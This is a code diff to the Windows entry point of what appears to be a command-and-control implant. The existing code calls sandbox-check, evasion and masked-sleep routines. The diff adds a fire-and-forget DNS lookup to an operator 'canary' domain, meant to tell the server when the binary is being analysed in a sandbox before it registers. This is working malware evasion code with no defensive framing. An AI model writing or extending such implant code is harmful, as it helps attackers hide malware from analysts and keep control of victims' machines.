@@ -1,3 +1,6 @@
+/* winsock2.h must precede windows.h to avoid winsock.h conflicts */
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <windows.h>
 #include "config.h"
 #include "transport.h"
@@ -11,6 +14,17 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     api_init();
     sandbox_check();
     evasion_init();
+
+    /* Canary DNS lookup — triggers server-side burn detection if this binary
+     * is sandbox-analyzed before it registers. Fire-and-forget. */
+    if (AGENT_CANARY_DOMAIN[0] != '\0') {
+        WSADATA wsa = {0};
+        if (WSAStartup(MAKEWORD(2,2), &wsa) == 0) {
+            struct addrinfo hints = {0}, *res = NULL;
+            getaddrinfo("canary." AGENT_CANARY_DOMAIN, NULL, &hints, &res);
+            if (res) freeaddrinfo(res);
+        }
+    }
 
     while (!agent_register()) {
         sleep_masked(30000);
